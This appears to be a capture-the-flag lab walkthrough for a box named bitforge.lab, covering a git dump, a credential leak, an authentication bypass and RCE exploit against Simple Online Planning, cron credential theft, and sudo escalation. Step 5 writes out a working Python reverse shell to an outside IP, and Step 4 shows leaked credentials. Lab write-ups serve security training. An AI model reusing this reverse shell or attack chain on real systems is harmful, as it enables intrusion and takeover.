#box

*Created: 1/24/2026*

### Step 1

**Tags:** #git #git-dumper #Credentials-Leak #MySQL

**Command:**
```bash
python3 git_dumper.py http://bitforge.lab/.git ./web
```

*Port: 80*

> 
> The machine exposes on port 80 a website, we discover through the source code the presence of a subdomain named `plan.bitforge.lab`. Moreover, we discover a git folder and after dumping it we find out the credentials to authenticate to the exposed SQL Instance

---

### Step 2

**Tags:** #Credentials-Leak #Static-Code-Analysis #Simple-Online-Planning

**Command:**
```bash
# Authenticate in the app as admin:dbee8fd60fd4244695084bd84a996882|77ba9273d4bcfa9387ae8652377f4c189e5a47ee
```

*Port: 80*

> 
> Once authenticated, we discover a table `soplanning.planning_user` which contains the list of available users on the application. While trying to crack the password or replace it with a new one doesn't work, we downloaded the solution from [here](https://github.com/Worteks/soplanning/tree/master) and try to obtain further information on how the password is hashed on the database. We discover a vulnerability that permits use to authenticate anyways by passing `cle|password` at the authentication level, thus we authenticate with the `cle` and `password` discovered inside the table mentioned above

---

### Step 3

**Tags:** #RCE #Web-Shell #Simple-Online-Planning

**Command:**
```bash
python3 exp.py -t http://plan.bitforge.lab/www -u admin -p "dbee8fd60fd4244695084bd84a996882|77ba9273d4bcfa9387ae8652377f4c189e5a47ee"
```

*Port: 80*

> 
> Once authenticated we can leverage the vulnerability mentioned [here](https://www.exploit-db.com/exploits/52082) to gain a shell on the target machine. The script requires a small change in the parameters passed because our path is `/www/process/` and not only `/process`

---

### Step 4

**Tags:** #cron #Credentials-Leak

**Command:**
```bash
./pspy64
# Exposed credentials: mysqldump -u jack -pj4cKF0rg3@445 soplanning
```

> 
> Once on the machine, we discover a cleartext running on a `mysqldump` configured cron. Discovering the credentials of the user `jack` we authenticate as that user through SSH to have a stable shell

---

### Step 5

**Tags:** #flask #sudo-Privileges #Reverse-Shell #Python

**Command:**
```bash
echo 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.193",3306));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")' > app.py
```

> 
> Once authenticated as jack we realize we can a binary called `/usr/bin/flask_password_changer` as root. We check what the binary does and then update the target file `/opt/password_change_app/app.py` (the init file for `flask`) with a python reverse shell.

---

